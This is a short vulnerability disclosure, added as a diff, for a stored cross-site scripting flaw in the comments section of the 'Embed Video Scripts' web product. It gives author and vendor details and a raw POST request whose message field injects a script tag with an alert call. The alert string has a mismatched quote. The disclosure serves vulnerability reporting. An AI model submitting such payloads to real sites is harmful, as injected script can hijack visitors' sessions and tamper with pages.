@@ -1,0 +1,36 @@
+# Exploit Title: Embed Video Scripts - Cross-site Script (stored)
+# Google Dork: N/A
+# Date: 1 Jan 2019
+# Exploit Author: Deyaa Muhammad
+# Author EMail: contact [at] deyaa.me
+# Author Blog: http://deyaa.me
+# POC Video: https://youtu.be/2CFJLwkxpT8
+# Vendor Homepage: https://codeawesome.in/embed/
+# Software Link: https://codecanyon.net/item/embed-video-scripts/20831073
+# Demo Website: https://codeawesome.in/embed/
+# Version: N/A
+# Tested on: WIN7_x68/Linux
+# CVE : N/A
+
+# Description:
+A stored xss found in "Embed Video Scripts" comments section.
+
+# POC Request:
+
+:method: POST
+:authority: server
+:scheme: https
+:path: /embed/comments
+content-length: 145
+accept: */*
+origin: https://server
+x-requested-with: XMLHttpRequest
+user-agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+content-type: application/x-www-form-urlencoded; charset=UTF-8
+accept-encoding: gzip, deflate, br
+accept-language: en-US,en;q=0.9
+cookie: __cfduid=de9f1151befbf3ccdb372b7c1afb0a3bb1546252540
+cookie: _tccl_visitor=208f2702-6472-41aa-b129-088a32f1eda6
+cookie: _tccl_visit=208f2702-6472-41aa-b129-088a32f1eda6
+
+message=<script>alert('Deyaa)</script>&post_id=1&save=1&avatar=https%3A%2F%2Fserver%2Fembed%2Fassets%2Fimages%2Favatar%2F1.png
